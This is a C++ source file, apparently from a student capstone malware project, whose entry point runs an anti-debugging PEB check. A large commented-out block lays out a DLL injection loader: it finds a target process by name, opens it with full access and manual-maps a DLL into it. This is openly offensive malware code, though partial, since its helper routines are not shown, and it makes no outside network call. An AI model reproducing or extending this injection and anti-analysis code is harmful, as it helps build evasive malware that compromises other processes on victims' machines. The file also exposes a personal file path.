#include "../headers/injection.h"
#include "utils/headers/Tools.h"
#include "utils/headers/AntiAnalysis.h"
#include "API/headers/api.h"
#include <string>

// Temporary, the dll location/name and the name of the process to inject into
const char szDllFile[] = "C:\\Users\\scott\\OneDrive - Southern Alberta Institute of Technology\\SAIT\\ISS_S4\\capstone\\malware\\capstone\\bin\\x64\\Release\\dll.dll";
const char szProc[]    = "injector.exe";


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    AntiAnalysis   debug;
    Tools          tools;
    PROCESSENTRY32 PE32{0};
    PE32.dwSize =  sizeof(PE32);

    //HANDLE  hProcess = GetCurrentProcess();
    //HMODULE hNtdll   = LoadLibraryW(L"ntdll.dll");

    //API::API_ACCESS api;
    
    debug.PebCheck();


    //CloseHandle(hProc);

    return 0;
}



//
//AntiAnalysis   debug;
//Tools          tools;
//PROCESSENTRY32 PE32{ 0 };
//PE32.dwSize = sizeof(PE32);

//HANDLE  hProcess = GetCurrentProcess();
//HMODULE hNtdll   = LoadLibraryW(L"ntdll.dll");

//API::API_ACCESS api;

//api.ResolveFunctions(NULL,NULL,NULL);

//if (hNtdll == NULL) {
//    tools.ShowError("Failed to load ntdll.dll. Error: ", GetLastError());
//    CloseHandle(hProcess);
//    return 1;
//}
//
//API::API_FUNCTIONS functions; // accessing api functions

//// Cast the pointer to type ptNtQueryInformationProcess
// functions.ptNtQueryInformationProcess = reinterpret_cast<ptNtQueryInformationProcess_t>(
//    GetProcAddress(hNtdll, "NtQueryInformationProcess")
//    );

// if (!functions.ptNtQueryInformationProcess)
// {
//     tools.ShowError("Cannot Find Address");
//     return 0;
// }
//      
// std::string line = "Address of NtQueryInformationProcess = " + std::to_string(reinterpret_cast<uintptr_t>(functions.ptNtQueryInformationProcess));

// tools.DisplayMessage(line.c_str());

// functions.ptNtQueryInformationProcess = reinterpret_cast<ptNtQueryInformationProcess_t>(
//     API::GetProcessAddress(hNtdll, "NtQueryInformationProcess"));

// line = "Address of NtQueryInformationProcess from custom api = " + std::to_string(reinterpret_cast<uintptr_t>(functions.ptNtQueryInformationProcess));
// tools.DisplayMessage(line.c_str());



//debug.PebCheck(); // Check if being debugged

//HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); // Create snapshot of processes running

//if (hSnap == INVALID_HANDLE_VALUE)
//{
//    tools.ShowError("CreateToolhelp32Snapshot failed: ", GetLastError());
//    return 0;
//}


//BOOL bRet = Process32First(hSnap, &PE32);
//DWORD PID = 0;

//while (bRet)
//{
//    if (!strcmp(szProc, (const char *)PE32.szExeFile))
//    {
//        PID = PE32.th32ProcessID;
//        break;
//    }
//    bRet = Process32Next(hSnap, &PE32);
//}

//CloseHandle(hSnap);

//HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

//if (!hProc)
//{
//    tools.ShowError("OpenProcess failed: ", GetLastError());
//    return 0;
//}

//if (!ManualMap(hProc, szDllFile))
//{
//    tools.ShowError("Somethings fucked");
//    CloseHandle(hProc);
//    return 0;
//}

//CloseHandle(hProc);